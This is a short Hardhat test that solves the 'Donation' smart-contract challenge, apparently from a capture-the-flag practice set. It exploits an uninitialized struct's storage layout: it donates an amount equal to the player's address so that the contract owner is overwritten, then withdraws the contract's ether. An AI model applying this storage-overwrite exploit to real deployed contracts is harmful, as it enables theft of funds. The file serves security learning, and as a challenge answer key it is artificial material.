import { expect } from 'chai';
import { ethers } from 'hardhat';
import { etherToWei } from '../utils';

describe('Donation', function () {
  it('should exploit how Struct uses storage', async function () {
    const [_, player] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory('DonationChallenge');
    const challenge = await Challenge.deploy({ value: etherToWei(1) });
    await challenge.deployed();

    const amountToDonate = ethers.BigNumber.from(player.address);
    const scale = ethers.BigNumber.from(10).pow(36);
    const fee = amountToDonate.div(scale);

    let tx = await challenge
      .connect(player)
      .donate(amountToDonate, { value: fee });
    await tx.wait();

    tx = await challenge.connect(player).withdraw();
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
